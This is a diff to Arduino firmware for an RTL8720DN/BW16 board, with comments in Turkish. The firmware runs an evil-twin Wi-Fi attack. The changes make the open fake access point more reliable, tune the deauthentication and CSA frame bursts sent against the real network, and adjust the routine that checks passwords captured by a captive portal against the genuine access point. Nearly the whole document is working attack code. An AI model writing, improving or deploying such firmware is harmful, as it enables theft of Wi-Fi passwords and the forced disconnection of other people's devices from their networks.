@@ -58,7 +58,7 @@ static uint8_t          et_rt_bssid[6] = {0};
 //
 // Ayrıca WiFi.enableConcurrent() setup'ta STA+AP eş zamanlı çalışması için şart.
 //
-// Kanal: char* string olarak geçilir ("6" gibi), uint8_t değil.
+// Kanal: char* string olarak geçilir ("6" gibi) — AmebaD SDK imzası: apbegin(ssid, channel, hidden)
 static void et_ap_start(const String &ap_ssid, int channel) {
   char s[64];
   char c[4];
@@ -66,37 +66,48 @@ static void et_ap_start(const String &ap_ssid, int channel) {
   s[sizeof(s) - 1] = '\0';
 
   // Kanal 1–13 arası; dışarıdaki değerleri 6'ya sabitle
-  int ch = channel;
-  if (ch < 1 || ch > 13) ch = 6;
+  int ch = (channel >= 1 && channel <= 13) ? channel : 6;
   snprintf(c, sizeof(c), "%d", ch);
 
-  // ── ADIM 1: Mevcut WiFi durumunu temizle ─────────────────────────────────
-  // delfyRTL (gorebrau) referans projesinde de disconnect() kullanılıyor.
-  WiFi.disconnect();
-  delay(250);
+  // ── ADIM 1: Tam WiFi stack sıfırlama ─────────────────────────────────────
+  //
+  // SORUN: WiFi.disconnect() WiFi stack'ini temizler ama önceki AP
+  // konfigürasyonunu (güvenlik tipi, şifre) önbellekte bırakır.
+  // setup()'ta WiFi.apbegin("X","20192019","1") ile WPA2 kurulduktan sonra
+  // WiFi.disconnect() çağrılsa bile SDK WPA2 güvenlik tipini saklar.
+  // Sonraki WiFi.apbegin(ssid, ch, (uint8_t)0) açık AP overload'u çağırsa da
+  // SDK önbellekteki WPA2 konfigürasyonunu kullanır → sahte AP şifreli üretilir.
+  //
+  // ÇÖZÜM: wifi_off() WiFi donanımını tamamen kapatır ve TÜM önbelleği temizler.
+  // wifi_on() (WiFi.enableConcurrent() içinde çağrılır) temiz STA+AP modunu başlatır.
+  // Bu sekans yönetim AP'sinin WPA2 kalıntısını tamamen ortadan kaldırır.
+  //
+  wifi_off();
+  delay(500);
+
+  // ── ADIM 1b: STA+AP (concurrent) modu başlat ─────────────────────────────
+  // WiFi.enableConcurrent() = wifi_on(RTW_MODE_STA_AP) — wifi_off() sonrası
+  // temiz stack üzerinde STA (WLAN0 injection) + AP (WLAN1 sahte AP) modunu açar.
+  WiFi.enableConcurrent();
+  delay(300);
 
   // ── ADIM 2: Açık AP başlat ────────────────────────────────────────────────
   //
-  // KRITIK — AmebaD SDK'da üç farklı apbegin() overload'u vardır:
-  //   (A) apbegin(ssid, password, channel, hidden) → şifreli AP
-  //   (B) apbegin(ssid, channel, hidden)           → AÇIK AP ← doğru olan bu
-  //   (C) apbegin(ssid, NULL/""  , channel)        → sessizce başarısız olur!
+  // wifi_off() sonrası önbellek temiz → apbegin(ssid, ch, (uint8_t)0) artık
+  // kesinlikle AÇIK AP oluşturur; WPA2 kalıntısı kalmaz.
   //
-  // delfyRTL kaynak kodu (gorebrau/delfyRTL RTL8720dn-firmware.ino):
-  //   status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
-  //
-  // (uint8_t)0 = hidden=false → AP beacon göndererek görünür olur.
-  // Return değeri WL_CONNECTED olana kadar yeniden denenir.
+  // AmebaD SDK overload seçimi:
+  //   (char*, char*, char*)   → ŞİFRELİ AP (setup/stop_evil_twin için)
+  //   (char*, char*, uint8_t) → AÇIK AP    (sahte AP için) ← bu form
   //
   int ap_status = WL_IDLE_STATUS;
-  for (int attempt = 0; attempt < 5 && ap_status != WL_CONNECTED; attempt++) {
+  for (int attempt = 0; attempt < 10 && ap_status != WL_CONNECTED; attempt++) {
     ap_status = WiFi.apbegin(s, c, (uint8_t)0);
-    if (ap_status != WL_CONNECTED) delay(500);
+    if (ap_status != WL_CONNECTED) delay(600);
   }
 
   // ── ADIM 3: WLAN0 güç tasarrufunu kapat ──────────────────────────────────
-  // AmebaD her WiFi.apbegin() çağrısında power-save'i yeniden etkinleştirir.
-  // Bu, WLAN0'ın uyku moduna girmesine ve raw frame injection'ın durmasına yol açar.
+  // AmebaD her apbegin() sonrası power-save'i sıfırlar; injection için kapalı olmalı.
   wifi_disable_powersave();
 }
 
@@ -733,11 +744,14 @@ static bool et_verify_password(const String &password) {
   // 1. DNS'i durdur
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
 
-  // 2. AP modunu kapat — AmebaD'de AP→STA geçişi için WiFi.disconnect() ZORUNLU.
-  //    Bu yapılmadan WiFi.begin() sessizce başarısız olur; bağlantı hiç kurulmaz.
-  //    Referans: Janek79ax/BW16-ESP32-Evil-Twin verifyPassword()
-  WiFi.disconnect();
-  delay(300);
+  // 2. Tam WiFi stack sıfırla → STA moduna hazırla
+  //
+  // WiFi.disconnect() STA moduna geçirmez, sadece bağlantıyı keser.
+  // wifi_off() sonrası WiFi.begin() stack'i sıfırdan STA modunda başlatır.
+  // Bu şekilde WPA2 önbelleği veya AP kalıntısı olmadan temiz bağlantı denenebilir.
+  //
+  wifi_off();
+  delay(500);
 
   // 3. STA modunda gerçek AP'ye bağlanmayı dene
   char et_ssid_buf[64];
@@ -752,11 +766,11 @@ static bool et_verify_password(const String &password) {
     delay(100);
   }
 
-  // 4. STA'yı kapat
-  WiFi.disconnect();
-  delay(300);
+  // 4. STA'yı kapat — wifi_off() ile tam temizlik
+  wifi_off();
+  delay(500);
 
-  // 5. ET AP'yi yeniden başlat (et_ap_start: disconnect+apbegin(ssid,ch,(uint8_t)0))
+  // 5. ET AP'yi yeniden başlat — et_ap_start içinde kendi wifi_off/on döngüsü var
   et_ap_start(evil_twin_ssid, evil_twin_channel);
   delay(400);
 
@@ -794,32 +808,26 @@ static rtw_result_t et_retrack_handler(rtw_scan_handler_result_t *scan_result) {
 }
 
 static void et_retrack() {
-  // ── ARAŞTIRMA BULGUSU: wifi_scan_networks() AP çalışırken çağrılmamalı ──
+  // ── AP KAPATILMADAN TARAMA ─────────────────────────────────────────────────
   //
-  // RTL8720DN tek radyo paylaşımlı mimari:
-  //   wifi_scan_networks() → tüm kanallara hop yapar → AP beacon'ları kesilir
-  //   → istemciler düşer, AP "kaybolur"
-  //   → Scan fonksiyonu SoftAP aktifken RTW_ERROR döndürebilir.
+  // RTL8720dn concurrent modunda WLAN0 ve WLAN1 bağımsız arayüzlerdir:
+  //   WLAN0 = STA / frame injection  → wifi_scan_networks() + deauth bursts
+  //   WLAN1 = SoftAP                 → WiFi.apbegin() → beacon göndermeye devam
   //
-  // Çözüm: AP durdur → tara → AP yeniden başlat.
-  // et_ap_start() zaten WiFi.disconnect() + delay yapar.
+  // wext_set_channel(WLAN0_NAME, ...) zaten deauth burst'lerde AP'yi etkilemeden
+  // kanal atlamak için kullanılıyor. Aynı prensiple wifi_scan_networks() çağrısı
+  // WLAN0 üzerinden yapılır; WLAN1 beacon göndermeye devam eder.
   //
-  // Referans: forum.amebaiot.com, RTL8720dn-5GHz-Wifi-Deauther, Evil-BW16.
+  // WiFi.disconnect() + AP restart KALDIRILDI → AP kesintisiz çalışır.
 
-  // 1. DNS durdur
-  if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
-
-  // 2. Radyoyu serbest bırak
-  WiFi.disconnect();
-  delay(100);
-
-  // 3. Tara — radyo artık serbest, AP yok, scan çalışabilir
   et_rt_found   = false;
   et_rt_channel = 0;
+
+  // WLAN0 üzerinden tara — WLAN1 (AP) etkilenmez
   bool scan_ok = (wifi_scan_networks(et_retrack_handler, NULL) == RTW_SUCCESS);
   if (scan_ok) delay(3000); // Taramanın tamamlanmasını bekle
 
-  // 4. Kanal/BSSID değişikliği var mı?
+  // Kanal/BSSID değişikliği var mı?
   bool channel_changed = false;
   bool bssid_changed   = false;
   if (et_rt_found) {
@@ -829,15 +837,7 @@ static void et_retrack() {
     if (bssid_changed)   memcpy(evil_twin_bssid, et_rt_bssid, 6);
   }
 
-  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+apbegin(ssid,ch,(uint8_t)0))
-  et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(400);
-
-  // 6. DNS'i yeniden başlat
-  et_dns_udp.begin(53);
-  et_dns_started = true;
-
-  // 7. Kanal değiştiyse hemen deauth burst gönder
+  // Kanal değiştiyse hemen deauth burst gönder — AP yeniden başlatmaya gerek yok
   if (channel_changed || bssid_changed) et_last_deauth_ms = 0;
 }
 
@@ -911,9 +911,21 @@ static void et_send_deauth_burst() {
   wifi_tx_csa_frame(evil_twin_bssid,  0);
   wifi_tx_csa_frame(evil_twin_bssid, 14);
 
-  // ── İkinci band (çift bant aktifse, WLAN0 kanal değiştir) ────────────────
-  // AP WLAN1'de güvenle devam eder; WLAN0 kanal değişikliği sadece injection'ı etkiler.
-  if (evil_twin_dual_band && evil_twin_channel2 > 0) {
+  // ── İkinci band (çift bant aktifse) ──────────────────────────────────────
+  //
+  // KRİTİK — RTL8720dn tek fiziksel radyo paylaşır:
+  //   Sahte AP (WLAN1) 2.4GHz kanalda çalışır.
+  //   WLAN0 5GHz kanala hop yaparsa fiziksel radyo 5GHz'e geçer →
+  //   WLAN1 beacon gönderemez → AP çöker / kaybolur.
+  //
+  // Bu yüzden: ikinci band YALNIZCA aynı RF bandındaysa (2.4GHz↔2.4GHz)
+  // saldırı yapılır. 5GHz ikinci bant ise atlanır — AP kararlılığı önceliklidir.
+  //
+  bool primary_is_5g = (evil_twin_channel >= 36);
+  bool secondary_is_5g = (evil_twin_channel2 >= 36);
+  bool same_band = (primary_is_5g == secondary_is_5g);
+
+  if (evil_twin_dual_band && evil_twin_channel2 > 0 && same_band) {
     wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel2);
     const char *ssid_c2 = (evil_twin_ssid2.length() > 0)
                             ? evil_twin_ssid2.c_str() : ssid_c;
@@ -976,23 +988,34 @@ void stop_evil_twin() {
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
 
   // Yönetim AP'sini yeniden başlat.
-  WiFi.disconnect();
-  delay(250);
+  //
+  // SORUN: Yoğun frame injection + birden fazla WiFi.disconnect() döngüsü
+  // sonrası WiFi stack tutarsız durumda kalır. WiFi.disconnect() tek başına
+  // yeterli değil — SDK önceki AP konfigürasyonunu (güvenlik tipi, şifre)
+  // önbellekte tutar. wifi_off() TÜM stack durumunu ve önbelleği temizler.
+  //
+  wifi_off();
+  delay(1000);
+
+  // STA+AP concurrent modu başlat (wifi_off() sonrası temiz stack)
+  WiFi.enableConcurrent();
+  delay(300);
+
   {
     char c[] = "1";
     int ap_status = WL_IDLE_STATUS;
-    for (int attempt = 0; attempt < 5 && ap_status != WL_CONNECTED; attempt++) {
+    for (int attempt = 0; attempt < 10 && ap_status != WL_CONNECTED; attempt++) {
       ap_status = WiFi.apbegin(ssid, pass, c);
-      if (ap_status != WL_CONNECTED) delay(500);
+      if (ap_status != WL_CONNECTED) {
+        // apbegin başarısız olursa kısa bekleme sonrası tekrar dene
+        // (wifi_off/on zaten yapıldı, tekrar gerekmiyor)
+        delay(800);
+      }
     }
   }
-  delay(200);
-
-  // Concurrent modu yeniden etkinleştir (delfyRTL destroyAP() referans)
-  WiFi.enableConcurrent();
+  delay(500);
 
   // Yönetim AP yeniden başladıktan sonra power-save'i tekrar kapat.
-  // AmebaD her apbegin() sonrasında power-save'i sıfırlar; WLAN0 injection için aktif kalmalı.
   wifi_disable_powersave();
 }
 
@@ -1011,11 +1034,9 @@ void evil_twin_loop() {
     et_send_deauth_burst();
   }
 
-  // Kanal takibi: ET_RETRACK_INTERVAL_MS ms'de bir (~5 sn bloklayan tarama)
-  if (now - et_last_retrack_ms >= ET_RETRACK_INTERVAL_MS) {
-    et_last_retrack_ms = now;
-    et_retrack();
-  }
+  // NOT: et_retrack() devre dışı — wifi_scan_networks() AP aktifken
+  // fiziksel radyoyu tüm kanallara hoplatır, WLAN1 beacon'larını keser.
+  // Hedef kanal değişirse evil twin'i durdurup yeniden başlatmak gerekir.
 }
 
 // ─── Captive Portal HTTP işleyici ────────────────────────────────────────────
